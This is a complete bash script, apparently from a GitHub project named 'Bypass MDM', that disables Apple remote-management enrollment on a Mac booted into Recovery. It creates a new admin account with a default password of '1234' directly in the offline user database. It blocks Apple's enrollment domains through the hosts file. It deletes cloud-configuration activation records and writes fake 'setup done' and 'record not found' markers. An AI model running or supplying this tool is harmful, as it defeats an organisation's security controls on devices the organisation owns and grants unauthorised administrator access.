#!/bin/bash

# ═══════════════════════════════════════════════════
# Bypass MDM v3 — assafdori/bypass-mdm
# v1 volume logic + v2 robustness + manual fallback
# ═══════════════════════════════════════════════════

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

error_exit() { echo -e "${RED}✗ ERROR: $1${NC}" >&2; exit 1; }
warn()        { echo -e "${YEL}⚠ WARNING: $1${NC}"; }
success()     { echo -e "${GRN}✓ $1${NC}"; }
info()        { echo -e "${BLU}ℹ $1${NC}"; }

# ─── Input validation ─────────────────────────────────────────
validate_username() {
    local u="$1"
    [ -z "$u" ]          && { echo "Cannot be empty"; return 1; }
    [ ${#u} -gt 31 ]     && { echo "Max 31 characters"; return 1; }
    [[ "$u" =~ ^[a-zA-Z0-9_-]+$ ]] || { echo "Only letters, numbers, _ or -"; return 1; }
    [[ "$u" =~ ^[a-zA-Z_] ]]        || { echo "Must start with a letter or _"; return 1; }
    return 0
}

validate_password() {
    local p="$1"
    [ -z "$p" ]      && { echo "Cannot be empty"; return 1; }
    [ ${#p} -lt 4 ]  && { echo "Minimum 4 characters"; return 1; }
    return 0
}

check_user_exists() {
    dscl -f "$1" localhost -read "/Local/Default/Users/$2" &>/dev/null
}

find_available_uid() {
    local dscl_path="$1" uid=501
    while [ $uid -lt 600 ]; do
        dscl -f "$dscl_path" localhost -search /Local/Default/Users UniqueID "$uid" 2>/dev/null \
            | grep -q "UniqueID" || { echo "$uid"; return 0; }
        uid=$((uid + 1))
    done
    echo "501"
}

# ─── Volume detection: v1-style first, then auto, then manual ─
detect_volumes() {
    local sys="" dat=""
    info "Detecting volumes..." >&2

    # ── Priority 1: Standard macOS names (v1 approach extended) ──
    # Check for Monterey HD or standard Macintosh HD
    if [ -d "/Volumes/Monterey HD/System" ]; then
        sys="Monterey HD"
    elif [ -d "/Volumes/Macintosh HD/System" ]; then
        sys="Macintosh HD"
    fi

    if [ -n "$sys" ]; then
        success "System volume detected: $sys" >&2
    fi

    # Detect Data Volume matching the standard names
    if [ -d "/Volumes/Monterey HD - Data" ]; then
        info "Renaming 'Monterey HD - Data' → 'Data'..." >&2
        if diskutil rename "Monterey HD - Data" "Data" &>/dev/null; then
            dat="Data"
            success "Data volume renamed and set to: $dat" >&2
        else
            dat="Monterey HD - Data"
            warn "Rename failed, using: $dat" >&2
        fi
    elif [ -d "/Volumes/Macintosh HD - Data" ]; then
        info "Renaming 'Macintosh HD - Data' → 'Data'..." >&2
        if diskutil rename "Macintosh HD - Data" "Data" &>/dev/null; then
            dat="Data"
            success "Data volume renamed and set to: $dat" >&2
        else
            dat="Macintosh HD - Data"
            warn "Rename failed, using: $dat" >&2
        fi
    elif [ -d "/Volumes/Data" ]; then
        dat="Data"
        success "Data volume: $dat" >&2
    fi

    # ── Priority 2: Auto-detect (v2 fallback) ──
    if [ -z "$sys" ]; then
        info "Standard name not found, trying auto-detection..." >&2
        for vol in /Volumes/*/; do
            local name; name=$(basename "$vol")
            if [[ "$name" != *Data* ]] && [[ "$name" != *Recovery* ]] && [ -d "/Volumes/$name/System" ]; then
                sys="$name"
                warn "Auto-detected system volume: $sys" >&2
                break
            fi
        done
    fi

    if [ -z "$dat" ]; then
        info "Trying to auto-detect data volume..." >&2
        for vol in /Volumes/*/; do
            local name; name=$(basename "$vol")
            if [[ "$name" == *Data* ]]; then
                dat="$name"
                warn "Auto-detected data volume: $dat" >&2
                break
            fi
        done
    fi

    # ── Priority 3: Manual input fallback ──
    if [ -z "$sys" ]; then
        echo -e "\n${YEL}Could not detect system volume automatically.${NC}" >&2
        echo -e "Available volumes in /Volumes/:" >&2
        ls /Volumes/ >&2
        echo ""
        read -rp "Enter system volume name exactly as shown above: " sys <&2
    fi

    if [ -z "$dat" ]; then
        echo -e "\n${YEL}Could not detect data volume automatically.${NC}" >&2
        echo -e "Available volumes in /Volumes/:" >&2
        ls /Volumes/ >&2
        echo ""
        read -rp "Enter data volume name exactly as shown above: " dat <&2
    fi

    [ -z "$sys" ] && error_exit "System volume is required. Aborting."
    [ -z "$dat" ] && error_exit "Data volume is required. Aborting."

    echo "$sys|$dat"
}

# ─── Init ─────────────────────────────────────────────────────
volume_info=$(detect_volumes)
SYS_VOL=$(echo "$volume_info" | cut -d'|' -f1)
DAT_VOL=$(echo "$volume_info" | cut -d'|' -f2)

SYS_PATH="/Volumes/$SYS_VOL"
DAT_PATH="/Volumes/$DAT_VOL"
DSCL_PATH="$DAT_PATH/private/var/db/dslocal/nodes/Default"

echo ""
echo -e "${CYAN}╔═════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║   Bypass MDM v3 — github.com/assafdori        ║${NC}"
echo -e "${CYAN}╚═════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${GRN}System Volume :${NC} $SYS_VOL"
echo -e "  ${GRN}Data Volume   :${NC} $DAT_VOL"
echo ""

# ─── Menu ─────────────────────────────────────────────────────
PS3='Choose an option: '
select opt in "Bypass MDM from Recovery" "Reboot & Exit"; do
    case $opt in

    "Bypass MDM from Recovery")
        echo ""
        echo -e "${YEL}═══════════════════════════════════════${NC}"
        echo -e "${YEL}   Starting MDM Bypass — Recovery     ${NC}"
        echo -e "${YEL}═══════════════════════════════════════${NC}"
        echo ""

        # Validate paths
        info "Validating system paths..."
        [ -d "$SYS_PATH" ]  || error_exit "System volume path not found: $SYS_PATH"
        [ -d "$DAT_PATH" ]  || error_exit "Data volume path not found: $DAT_PATH"
        [ -d "$DSCL_PATH" ] || error_exit "DSCL database not found: $DSCL_PATH"
        success "All paths validated"
        echo ""

        # ── Temporary user setup ──
        echo -e "${CYAN}Temporary Admin User Setup${NC}"
        echo -e "  (Press Enter to use defaults)"
        echo ""

        read -rp "Full name  [Apple]: " realName
        realName="${realName:-Apple}"

        while true; do
            read -rp "Username   [Apple]: " username
            username="${username:-Apple}"
            errmsg=$(validate_username "$username") && break || warn "$errmsg"
        done

        if check_user_exists "$DSCL_PATH" "$username"; then
            warn "User '$username' already exists in the database"
            read -rp "Use a different username? (y/n): " resp
            if [[ "$resp" =~ ^[Yy]$ ]]; then
                while true; do
                    read -rp "New username: " username
                    errmsg=$(validate_username "$username") || { warn "$errmsg"; continue; }
                    check_user_exists "$DSCL_PATH" "$username" \
                        && warn "User '$username' also exists. Try another." || break
                done
            fi
        fi

        while true; do
            read -rp "Password   [1234]: " passw
            passw="${passw:-1234}"
            errmsg=$(validate_password "$passw") && break || warn "$errmsg"
        done

        echo ""

        # ── Find UID ──
        info "Checking for available UID..."
        uid=$(find_available_uid "$DSCL_PATH")
        success "Using UID: $uid"
        echo ""

        # ── Create user ──
        info "Creating user account: $username"

        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$username" \
            || error_exit "Failed to create user record"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh" \
            || warn "Could not set shell"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$username" RealName "$realName" \
            || warn "Could not set full name"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$username" UniqueID "$uid" \
            || warn "Could not set UID"
        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20" \
            || warn "Could not set GID"

        home_dir="$DAT_PATH/Users/$username"
        if [ ! -d "$home_dir" ]; then
            mkdir -p "$home_dir" || error_exit "Failed to create home directory: $home_dir"
        else
            warn "Home directory already exists: $home_dir"
        fi

        dscl -f "$DSCL_PATH" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username" \
            || warn "Could not set home path"
        dscl -f "$DSCL_PATH" localhost -passwd "/Local/Default/Users/$username" "$passw" \
            || error_exit "Failed to set password"
        dscl -f "$DSCL_PATH" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username" \
            || error_exit "Failed to add user to admin group"

        success "User '$username' created successfully"
        echo ""

        # ── Block MDM domains ──
        info "Blocking MDM enrollment domains..."
        hosts_file="$SYS_PATH/etc/hosts"
        [ -f "$hosts_file" ] || touch "$hosts_file" || error_exit "Cannot create hosts file"

        grep -q "deviceenrollment.apple.com" "$hosts_file" \
            || echo "0.0.0.0 deviceenrollment.apple.com" >> "$hosts_file"
        grep -q "mdmenrollment.apple.com"    "$hosts_file" \
            || echo "0.0.0.0 mdmenrollment.apple.com"    >> "$hosts_file"
        grep -q "iprofiles.apple.com"        "$hosts_file" \
            || echo "0.0.0.0 iprofiles.apple.com"        >> "$hosts_file"

        success "MDM domains blocked"
        echo ""

        # ── Configuration profiles bypass ──
        info "Applying MDM configuration bypass..."
        cfg_path="$SYS_PATH/var/db/ConfigurationProfiles/Settings"
        mkdir -p "$cfg_path" 2>/dev/null

        touch "$DAT_PATH/private/var/db/.AppleSetupDone" 2>/dev/null \
            && success "Setup marked as complete" || warn "Could not mark setup done"

        rm -rf "$cfg_path/.cloudConfigHasActivationRecord" 2>/dev/null \
            && success "Removed activation record"    || info "No activation record to remove"
        rm -rf "$cfg_path/.cloudConfigRecordFound"    2>/dev/null \
            && success "Removed cloud config record"  || info "No cloud config record to remove"

        touch "$cfg_path/.cloudConfigProfileInstalled" 2>/dev/null \
            && success "Profile installed marker set" || warn "Could not set profile marker"
        touch "$cfg_path/.cloudConfigRecordNotFound"   2>/dev/null \
            && success "Record-not-found marker set"  || warn "Could not set not-found marker"

        echo ""
        echo -e "${GRN}╔═════════════════════════════════════════════════╗${NC}"
        echo -e "${GRN}║       MDM Bypass Completed Successfully!       ║${NC}"
        echo -e "${GRN}╚═════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}Next steps:${NC}"
        echo -e "  1. Close this terminal"
        echo -e "  2. Reboot your Mac"
        echo -e "  3. Login with:"
        echo -e "       Username : ${YEL}$username${NC}"
        echo -e "       Password : ${YEL}$passw${NC}"
        echo ""
        break
        ;;

    "Reboot & Exit")
        echo ""
        info "Rebooting system..."
        reboot
        break
        ;;

    *)
        echo -e "${RED}Invalid option $REPLY${NC}"
        ;;
    esac
done
